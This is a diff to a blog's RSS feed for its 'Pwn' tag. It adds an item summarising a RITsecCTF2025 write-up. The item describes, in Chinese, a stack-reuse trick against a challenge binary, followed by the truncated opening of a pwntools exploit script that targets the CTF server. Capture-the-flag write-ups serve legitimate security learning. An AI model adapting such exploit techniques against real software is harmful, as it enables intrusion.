@@ -6,7 +6,18 @@
     <description>Recent content in Pwn on 一只花盆.</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 01 Apr 2025 00:59:36 +0800</lastBuildDate><atom:link href="http://littflower.github.io/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 08 Apr 2025 10:28:47 +0800</lastBuildDate><atom:link href="http://littflower.github.io/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>RITsecCTF2025 WriteUp</title>
+      <link>http://littflower.github.io/posts/ritsecctf2025-writeup/</link>
+      <pubDate>Tue, 08 Apr 2025 10:28:47 +0800</pubDate>
+      
+      <guid>http://littflower.github.io/posts/ritsecctf2025-writeup/</guid>
+      <description>跟 n1 junior 的师傅们一起打了这场比赛，4 道出了 3 道，简单记录一下。
+bit_burger 思路比较简单，利用了函数调用/返回后不会清理栈空间的特性，先通过第一个位操作在栈上构造一个 backdoor 地址出来，第二步直接调用就可以了。
+#!/usr/bin/env python3 from pwn import * from sys import argv proc = &amp;#34;bit_burger.bin_patched&amp;#34; context.log_level = &amp;#34;debug&amp;#34; context.binary = proc elf = ELF(proc, checksec=False) libc = ELF(&amp;#34;./libc.so.6&amp;#34;, checksec=False) io = remote(&amp;#34;binex-bitburger.ctf.ritsec.club&amp;#34;, 32200) if argv[1] == &amp;#39;r&amp;#39; else process(proc) if args.G: gdb.attach(io, &amp;#34;b *0x401598&amp;#34;) ogg = 0x401355 s = &amp;#34;0&amp;#34; + bin(ogg)[2:] for i in range(len(s)): if s[len(s) - i - 1] == &amp;#34;1&amp;#34;: io.</description>
+    </item>
+    
     <item>
       <title>Glibc Exit 函数分析与利用</title>
       <link>http://littflower.github.io/posts/glibc-exit-function-analyze-and-attack/</link>
